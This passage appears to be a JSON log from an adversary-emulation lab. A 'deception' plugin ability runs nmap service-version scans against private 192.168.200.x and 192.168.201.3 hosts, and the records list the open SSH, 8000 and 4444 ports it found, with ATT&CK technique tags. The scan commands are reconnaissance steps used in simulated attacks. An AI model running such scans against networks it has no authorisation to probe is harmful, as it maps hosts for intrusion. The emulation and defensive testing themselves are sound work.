"2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:11Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:19:12Z"}, {"deadman": false, "finish": "2023-10-03T20:20:00Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.1,2,4,5,6,7,3", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 11, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.1,2,4,5,6,7,3", "unique": "scan.remote.addr192.168.200.1,2,4,5,6,7,3", "created": "2023-10-03T20:19:27Z", "relationships": []}], "unique": "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "decide": "2023-10-03T20:19:27Z", "status": 0, "score": 1, "pid": "20259", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a0220>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a1480>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a1c60>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a32b0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a1cf0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a0ee0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a0d30>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208a2c80>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af5d50>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720af7910>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af5240>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720af7f10>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7209d4bb0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7209d55d0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7209d5ae0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7209d5fc0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7209d6ec0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7209d4a90>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:20:00Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:20:00Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7209d4400>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7209d4580>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "sucxhr", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:19:28Z", "command": "nmap -sV --version-light -oX - 192.168.200.1,2,4,5,6,7,3", "facts": [{"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:11Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:19:28Z"}, {"deadman": false, "finish": "2023-10-03T20:20:16Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "910b2a40-9dd7-4e97-8a8a-8ce389ab5933", "plaintext_command": "nmap -sV --version-light -oX - 192.168.201.3", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 3, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "scan.remote.addr192.168.201.3", "created": "2023-10-03T20:20:02Z", "relationships": []}], "unique": "910b2a40-9dd7-4e97-8a8a-8ce389ab5933", "decide": "2023-10-03T20:20:02Z", "status": 0, "score": 1, "pid": "22916", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-03T20:20:16Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-03T20:20:16Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720a01ba0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720a01090>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-03T20:20:16Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-03T20:20:16Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720a006d0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720a00910>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "sucxhr", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:20:04Z", "command": "nmap -sV --version-light -oX - 192.168.201.3", "facts": [{"trait": "host.remote.ip", "links": ["910b2a40-9dd7-4e97-8a8a-8ce389ab5933", "cc7f9fa6-f992-4733-bcd2-58256bdd2a55"], "collected_by": ["sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-03T20:20:16Z", "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ports", "links": ["910b2a40-9dd7-4e97-8a8a-8ce389ab5933", "cc7f9fa6-f992-4733-bcd2-58256bdd2a55"], "collected_by": ["sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-03T20:20:16Z", "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])"]}, {"trait": "host.remote.port_services", "links": ["910b2a40-9dd7-4e97-8a8a-8ce389ab5933", "cc7f9fa6-f992-4733-bcd2-58256bdd2a55"], "collected_by": ["sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-03T20:20:16Z", "relationships": ["host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:20:04Z"}, {"deadman": false, "finish": 